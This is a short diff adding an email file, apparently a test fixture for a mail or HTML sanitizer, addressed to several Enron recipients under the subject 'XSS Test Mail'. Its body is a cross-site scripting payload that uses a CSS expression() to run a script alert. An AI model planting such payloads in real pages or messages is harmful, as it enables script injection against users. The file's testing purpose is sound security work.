@@ -1,0 +1,4 @@
+From: subscriptions@twst.com
+To: cassandra.shorter@enron.com, s..bradford@enron.com, donna.lowry@enron.com
+Subject: XSS Test Mail
+<DIV STYLE="background-image:expression((window.r==1)?'':(window.r=1,alert('OK_xSS')));">
